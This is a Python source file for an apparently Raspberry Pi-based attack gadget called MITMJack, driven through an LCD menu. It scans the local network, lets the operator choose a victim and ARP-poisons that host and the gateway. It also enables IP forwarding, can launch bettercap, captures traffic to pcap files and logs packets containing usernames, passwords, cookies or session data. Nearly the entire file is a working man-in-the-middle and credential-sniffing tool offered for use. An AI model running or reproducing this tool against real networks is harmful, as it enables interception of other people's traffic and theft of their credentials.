#!/usr/bin/env python3
# Raspyjack Payload: MITMJack v2.0

# --- IMPORTS ---
import sys
import os
import time
import signal
import threading
import logging
import json
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont
import subprocess

# Add Raspyjack root to path
RASPYJACK_ROOT = '/root/Raspyjack'
if os.path.isdir(RASPYJACK_ROOT) and RASPYJACK_ROOT not in sys.path:
    sys.path.insert(0, RASPYJACK_ROOT)

# --- CRITICAL HARDWARE IMPORTS ---
import LCD_Config
import LCD_1in44
import RPi.GPIO as GPIO

# --- APPLICATION-SPECIFIC IMPORTS ---
try:
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    from scapy.config import conf
    conf.ipv6_enabled = False
    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, sniff, PcapWriter, IP, Raw, DNSQR, DNS, DNSRR, UDP
    import nmap
    import netifaces
except ImportError as e:
    try:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
        image = Image.new("RGB", (128, 128), "BLACK")
        draw = ImageDraw.Draw(image)
        s_font = ImageFont.load_default()
        draw.text((5,2),"Import Error",font=s_font,fill="RED")
        draw.text((5,14,f"Module: {e.name}"),font=s_font,fill="WHITE")
        LCD.LCD_ShowImage(image,0,0)
        time.sleep(20)
    finally:
        with open("/tmp/mitmjack_payload.log","a") as f:
            f.write(f"Failed to import libraries: {e}\n")
        sys.exit(1)

# --- LOGGING SETUP ---
LOG_FILE = "/tmp/mitmjack_payload.log"
open(LOG_FILE,"w").close()
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')
def log(msg):
    logging.info(msg)

# --- GLOBALS ---
PINS = {"UP":6,"DOWN":19,"LEFT":5,"RIGHT":26,"KEY_PRESS":13,"KEY1":21,"KEY2":20,"KEY3":16}
RUNNING = True
DEBOUNCE_DELAY = 0.25
POISON_INTERVAL = 10
SAFETY_TIMEOUT = 3600
DNS_SPOOF = False
DNS_SPOOF_HOST = "example.com"
DNS_SPOOF_IP = ""
USE_BETTERCAP = False
packets_count = 0
last_packets_time = time.time()
packets_rate = 0
active_flows = set()
logs = []
pcap_writer = None
sniff_thread = None

# --- FONTS ---
font = None
small_font = None
def setup_fonts():
    global font, small_font
    try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",14)
        small_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",11)
    except:
        font = ImageFont.load_default()
        small_font = ImageFont.load_default()

# --- DRAW HELPERS ---
def draw_text(draw,text,pos,in_font,fill="WHITE"):
    draw.text(pos,text,font=in_font,fill=fill)
def draw_centered(draw,text,y,in_font,fill="WHITE"):
    bbox = draw.textbbox((0,0),text,font=in_font)
    x = (128-(bbox[2]-bbox[0]))//2
    draw.text((x,y),text,font=in_font,fill=fill)
def display_message(draw,image,msgs):
    draw.rectangle([(0,0),(128,128)],fill="BLACK")
    y=40
    for line in msgs:
        draw_centered(draw,line,y,font,"LIME")
        y+=20
    LCD.LCD_ShowImage(image,0,0)

def draw_menu(draw,title,items,selected_index, bettercap_enabled=False):
    draw.rectangle([(0,0),(128,128)],fill="BLACK")
    draw_centered(draw,title,5,font,"CYAN")
    draw.line([(10,25),(118,25)],fill="CYAN",width=1)
    max_display = 4
    start_index = max(0, selected_index-(max_display//2))
    y = 30
    for i in range(start_index,min(len(items),start_index+max_display)):
        item = items[i]
        name = item.get('name','') or item['ip']
        if len(name)>20: name=name[:19]+"…"
        if i==selected_index:
            draw.rectangle([(0,y-2),(128,y+22)],fill="BLUE")
            draw_text(draw,name,(5,y),small_font,"YELLOW")
            draw_text(draw,item['ip'],(5,y+11),small_font,"YELLOW")
        else:
            draw_text(draw,name,(5,y),small_font,"WHITE")
            draw_text(draw,item['ip'],(5,y+11),small_font,"WHITE")
        y+=25
    draw_text(draw,f"Bettercap: {'ON' if bettercap_enabled else 'OFF'}",(5,115),small_font,"CYAN")
    LCD.LCD_ShowImage(image,0,0)

def draw_confirm_screen(draw,target,interval):
    draw.rectangle([(0,0),(128,128)],fill="BLACK")
    draw_centered(draw,"Confirm MITM",5,font,"ORANGE")
    draw.line([(10,25),(118,25)],fill="ORANGE",width=1)
    target_ip = target.get('ip','N/A')
    target_name = target.get('name','') or target_ip
    draw_text(draw,"Target:",(10,35),font,"WHITE")
    draw_text(draw,target_name,(10,55),small_font,"YELLOW")
    draw_text(draw,target_ip,(10,70),small_font,"YELLOW")
    draw_text(draw,"Interval:",(10,90),font,"WHITE")
    draw_text(draw,str(interval)+"s",(100,90),font,"YELLOW")
    draw_centered(draw,"Press KEY1 to toggle BC",105,small_font,"RED")
    draw_centered(draw,"OK to start",115,small_font,"LIME")

def draw_attacking_screen(draw,target,interval,rate,flows, bettercap_enabled):
    draw.rectangle([(0,0),(128,128)],fill="BLACK")
    draw_centered(draw,"MITM ACTIVE",5,font,"RED")
    draw.line([(10,25),(118,25)],fill="RED",width=1)
    target_ip = target.get('ip','N/A')
    target_name = target.get('name','') or target_ip
    draw_text(draw,"Target:",(10,35),small_font,"WHITE")
    draw_text(draw,target_name,(10,45),small_font,"YELLOW")
    draw_text(draw,target_ip,(10,55),small_font,"YELLOW")
    draw_text(draw,"Interval:",(10,70),small_font,"WHITE")
    draw_text(draw,str(interval)+"s",(80,70),small_font,"YELLOW")
    draw_text(draw,"Pkts/sec:",(10,85),small_font,"WHITE")
    draw_text(draw,str(rate),(80,85),small_font,"YELLOW")
    draw_text(draw,"Flows:",(10,100),small_font,"WHITE")
    draw_text(draw,str(flows),(80,100),small_font,"YELLOW")
    draw_text(draw,f"Bettercap: {'ON' if bettercap_enabled else 'OFF'}",(10,115),small_font,"CYAN")
    draw_centered(draw,"LEFT to stop",105,small_font,"LIME")
    LCD.LCD_ShowImage(image,0,0)

# --- MITM LOGIC ---
class AttackThread(threading.Thread):
    def __init__(self,my_mac,gateway_ip,target_ip,target_mac,poison_interval,target_name='',interface=''):
        super().__init__()
        self.my_mac = my_mac
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.poison_interval = poison_interval
        self.interface = interface
        self.target_name = target_name
        self.stop_event = threading.Event()
        self.daemon = True
        self.start_time = None
        self.bettercap_proc = None

    def run(self):
        global sniff_thread, pcap_writer
        log(f"Starting MITM on {self.target_ip} with interval {self.poison_interval}s")
        self.start_time = time.time()
        gateway_mac = get_mac(self.gateway_ip)
        if not gateway_mac:
            log("Could not get gateway MAC.")
            return
        enable_forwarding()
        start_pcap()
        if USE_BETTERCAP:
            try:
                self.bettercap_proc = subprocess.Popen(["bettercap","-iface",self.interface,"-caplet","http-ui","--no-discovery"])
                log("Bettercap started for advanced features.")
            except Exception as e:
                log(f"Failed to start bettercap: {e}")
        sniff_thread = threading.Thread(target=sniff_loop,args=(self.interface,))
        sniff_thread.daemon=True
        sniff_thread.start()
        while not self.stop_event.is_set() and (time.time()-self.start_time < SAFETY_TIMEOUT):
            self.send_spoof_packet(self.gateway_ip,self.target_ip,self.target_mac)
            self.send_spoof_packet(self.target_ip,self.gateway_ip,gateway_mac)
            time.sleep(self.poison_interval)
        if not self.stop_event.is_set():
            log("Safety timeout reached.")
        self.stop()

    def send_spoof_packet(self,src_ip,dest_ip,dest_mac):
        if not dest_mac: return
        arp = ARP(op=2,psrc=src_ip,pdst=dest_ip,hwdst=dest_mac)
        ether = Ether(src=self.my_mac,dst=dest_mac)
        packet = ether/arp
        sendp(packet,verbose=False,iface=self.interface)

    def send_restore_packet(self,src_ip,dest_ip,src_mac,dest_mac):
        if not src_mac or not dest_mac: return
        arp = ARP(op=2,psrc=src_ip,pdst=dest_ip,hwsrc=src_mac,hwdst=dest_mac)
        ether = Ether(src=src_mac,dst=dest_mac)
        packet = ether/arp
        sendp(packet,verbose=False,iface=self.interface)

    def stop(self):
        global sniff_thread, pcap_writer
        self.stop_event.set()
        log(f"Stopping MITM on {self.target_ip}.")
        gateway_mac = get_mac(self.gateway_ip)
        if gateway_mac:
            for _ in range(5):
                self.send_restore_packet(self.gateway_ip,self.target_ip,gateway_mac,self.target_mac)
                self.send_restore_packet(self.target_ip,self.gateway_ip,self.target_mac,gateway_mac)
                time.sleep(0.5)
        disable_forwarding()
        if self.bettercap_proc:
            self.bettercap_proc.terminate()
            log("Bettercap stopped.")
        if sniff_thread:
            sniff_thread.join(timeout=1)
        stop_pcap()
        save_logs()

# --- PACKET HANDLER ---
def process_packet(pkt):
    global packets_count, active_flows, pcap_writer, logs
    packets_count += 1
    if IP in pkt:
        flow = (pkt[IP].src,pkt[IP].dst)
        active_flows.add(flow)
    if Raw in pkt:
        try:
            load = pkt[Raw].load.decode(errors='ignore').lower()
            if any(k in load for k in ['username','password','cookie','session']):
                logs.append({"time":datetime.now().isoformat(),"type":"credential","data":load[:100]})
        except: pass
    if pcap_writer:
        pcap_writer.write(pkt)

def sniff_loop(interface):
    sniff(iface=interface,prn=process_packet,store=0,stop_filter=lambda p:not RUNNING)

# --- FORWARDING & PCAP ---
def enable_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward','w') as f: f.write('1')
    subprocess.call(["iptables","-P","FORWARD","ACCEPT"])
    log("IP forwarding enabled.")

def disable_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward','w') as f: f.write('0')
    subprocess.call(["iptables","-F"])
    subprocess.call(["iptables","-P","FORWARD","DROP"])
    log("IP forwarding disabled.")

def start_pcap():
    global pcap_writer
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"/tmp/mitmjack_{ts}.pcap"
    pcap_writer = PcapWriter(filename)
    log(f"PCAP started: {filename}")

def stop_pcap():
    global pcap_writer
    if pcap_writer: pcap_writer.close(); pcap_writer=None; log("PCAP stopped.")

def save_logs():
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"/tmp/mitmjack_logs_{ts}.json"
    with open(filename,'w') as f: json.dump(logs,f)
    log(f"Logs saved: {filename}")

# --- NETWORK HELPERS ---
def get_mac(ip):
    try:
        ans,_ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2,verbose=0)
        for _,rcv in ans: return rcv[Ether].src
    except Exception as e:
        log(f"Could not get MAC for {ip}: {e}")
        return None

def get_network_info():
    try:
        gws = netifaces.gateways()
        default_gw = gws.get('default',{}).get(netifaces.AF_INET)
        if not default_gw: return None,None,None,None
        gateway_ip = default_gw[0]; interface = default_gw[1]
        my_mac = get_if_hwaddr(interface)
        addrs = netifaces.ifaddresses(interface)
        my_ip = addrs[netifaces.AF_INET][0]['addr']
        netmask = addrs[netifaces.AF_INET][0]['netmask']
        cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
        network_range = f"{my_ip}/{cidr}"
        log(f"Gateway:{gateway_ip} Interface:{interface} MAC:{my_mac} Network:{network_range}")
        return gateway_ip,my_mac,network_range,my_ip
    except Exception as e:
        log(f"Error getting network info: {e}")
        return None,None,None,None

def scan_network(draw,image,network_range):
    log(f"Scanning network: {network_range}")
    display_message(draw,image,["Scanning...",network_range])
    nm = nmap.PortScanner()
    try: nm.scan(hosts=network_range,arguments='-sn -R')
    except nmap.PortScannerError:
        log("Nmap not found. Please install it."); return []
    hosts = []
    import socket,subprocess
    def mdns_lookup(ip):
        try:
            r = subprocess.check_output(["avahi-resolve-address",ip],stderr=subprocess.DEVNULL).decode().strip().split("\t")
            return r[1] if len(r)>=2 else ""
        except: return ""
    def netbios_lookup(ip):
        try:
            r = subprocess.check_output(["nmblookup","-A",ip],stderr=subprocess.DEVNULL).decode()
            for l in r.splitlines():
                if "<00>" in l or "<20>" in l: return l.split()[0]
        except: return ""
    for host_ip in nm.all_hosts():
        if 'mac' in nm[host_ip]['addresses']:
            hostname = nm[host_ip].hostname()
            if not hostname or hostname==host_ip:
                try: fq = socket.getfqdn(host_ip); hostname=fq if fq!=host_ip else hostname
                except: pass
            if not hostname or hostname==host_ip: hostname=mdns_lookup(host_ip)
            if not hostname or hostname==host_ip: hostname=netbios_lookup(host_ip)
            if hostname==host_ip: hostname=""
            hosts.append({'ip':host_ip,'mac':nm[host_ip]['addresses']['mac'],'name':hostname})
    log(f"Scan found {len(hosts)} hosts.")
    return hosts

# --- CLEANUP ---
def cleanup(*_):
    global RUNNING
    if not RUNNING: return
    RUNNING=False
    log("Cleanup called. Exiting.")
    try:
        if LCD:
            img = Image.new("RGB",(128,128),"BLACK")
            d = ImageDraw.Draw(img)
            draw_centered(d,"Exiting...",55,font,"WHITE")
            LCD.LCD_ShowImage(img,0,0); time.sleep(0.5); LCD.LCD_Clear()
        GPIO.cleanup()
    except Exception as e: log(f"Exception during cleanup: {e}")

# --- MAIN ---
if __name__=="__main__":
    signal.signal(signal.SIGINT,cleanup)
    signal.signal(signal.SIGTERM,cleanup)
    state = 'init'
    last_press = 0
    online_hosts = []
    selected_index = 0
    attack_thread = None
    gateway_ip,my_mac,network_range,my_ip = None,None,None,None
    interface=None
    setup_fonts()
    try:
        GPIO.setmode(GPIO.BCM)
        for pin in PINS.values(): GPIO.setup(pin,GPIO.IN,pull_up_down=GPIO.PUD_UP)
        LCD = LCD_1in44.LCD(); LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT); LCD.LCD_Clear()
        image = Image.new("RGB",(128,128),"BLACK"); draw = ImageDraw.Draw(image)
        try: subprocess.check_call(["which","bettercap"],stdout=subprocess.DEVNULL); USE_BETTERCAP=True; log("Bettercap detected.")
        except: USE_BETTERCAP=False; log("Bettercap not found, using basic mode.")

        while RUNNING:
            now = time.time()
            # --- STATE MACHINE ---
            if state=='init':
                display_message(draw,image,["MITMJack","Initializing..."])
                gateway_ip,my_mac,network_range,my_ip = get_network_info()
                if not all([gateway_ip,my_mac,network_range]): display_message(draw,image,["Network Error","Check logs."]); time.sleep(5); RUNNING=False; continue
                interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
                online_hosts = scan_network(draw,image,network_range)
                selected_index = 0
                state='menu'

            elif state=='menu':
                draw_menu(draw,"Select Target",online_hosts,selected_index,USE_BETTERCAP)
                # --- NAVIGATION ---
                if (now-last_press) > DEBOUNCE_DELAY:
                    if GPIO.input(PINS["UP"])==0: selected_index=(selected_index-1)%len(online_hosts); last_press=now
                    if GPIO.input(PINS["DOWN"])==0: selected_index=(selected_index+1)%len(online_hosts); last_press=now
                    if GPIO.input(PINS["KEY1"])==0: USE_BETTERCAP=not USE_BETTERCAP; last_press=now
                    if GPIO.input(PINS["KEY_PRESS"])==0: state='confirm_attack'; last_press=now
                time.sleep(0.1)

            elif state=='confirm_attack':
                target = online_hosts[selected_index]
                draw_confirm_screen(draw,target,POISON_INTERVAL)
                if (now-last_press)>DEBOUNCE_DELAY:
                    if GPIO.input(PINS["KEY1"])==0: USE_BETTERCAP=not USE_BETTERCAP; last_press=now
                    if GPIO.input(PINS["KEY_PRESS"])==0:
                        target_ip = target['ip']; target_mac = target['mac']
                        attack_thread = AttackThread(my_mac,gateway_ip,target_ip,target_mac,POISON_INTERVAL,target_name=target.get('name',''),interface=interface)
                        attack_thread.start(); state='attacking'; last_press=now
                    if GPIO.input(PINS["LEFT"])==0: state='menu'; last_press=now
                time.sleep(0.1)

            elif state=='attacking':
                rate = packets_count
                flows = len(active_flows)
                target = online_hosts[selected_index]
                draw_attacking_screen(draw,target,POISON_INTERVAL,rate,flows,USE_BETTERCAP)
                if (now-last_press)>DEBOUNCE_DELAY and GPIO.input(PINS["LEFT"])==0:
                    if attack_thread: attack_thread.stop(); attack_thread.join(); attack_thread=None
                    packets_count=0; active_flows.clear()
                    state='menu'; last_press=now
                time.sleep(0.1)

    finally:
        cleanup()